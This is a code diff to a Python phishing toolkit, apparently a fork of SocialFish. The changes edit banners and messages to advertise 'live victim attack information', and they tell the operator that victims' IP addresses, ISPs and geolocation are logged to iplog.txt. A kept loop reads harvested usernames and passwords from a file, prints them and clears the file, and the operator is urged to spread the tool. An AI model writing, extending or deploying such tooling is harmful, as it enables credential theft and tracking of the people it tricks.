@@ -55,7 +55,7 @@ def end():
               |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
- {0}This script was made by UndeadSec_ But I have added some more features in it ]
+               {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
 [ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(RED, END, CYAN)
 
@@ -102,24 +102,26 @@ def runPhishing(social, option2):
         
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
-    print " {0}[{1}*{0}]{1} I HAVE A TIP FOR YOU".format(GREEN, END) 
+  
     print '''{0}
    _.-=-._     .-, 
  .'       "-.,' / 
 (  AnonUD4Y_  ~.< 
- `=.____.="  `._\\
- [{1}*{0}]{1} Do you need more help to make your ngrok link more trusted. 
- [{1}*{0}]{1} Just visit to [https://iplogger.org]
- [{1}*{0}]{1} This will help you to trace your victims by their ip address on real time. 
- [{1}*{0}]{1} And make your ngrok link more trusted type.{0}'''.format(CYAN, END)
+ `=.____.="  `._\\ 
+ 
+ [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION  
+ [{1}*{0}]{1} JUST GOTO YOUR [ SocialFish/server/www/iplog.txt ]
+ [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
    
-    print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(RED, END)
+    print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+            print ' {0}VICTIM INFORMATION AVAILABLE IN [ server/www/iplog.txt ]{1}\n {0}{1}'.format(RED, END)
+            print ' {0}HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE AVILABLE TO ALL PEOPLE {1}\n {0}{1}'.format(RED, END)
         creds.close()
 
 def runPEnv():
@@ -138,8 +140,8 @@ def runPEnv():
       .    '   '....'               ..'.      ' .
          '  .                     .     '          '     '  {1}v2.0{2} 
                '  .  .  .  .  . '.    .'              '  .
-                   '         '    '. '      {1}Updated_By--> AnonUD4Y_{2}    
-                     '       '      '             
+                   '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}    
+                     '        {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]      
                        ' .  '
                            '
                              {1}'''.format(GREEN, END, CYAN)
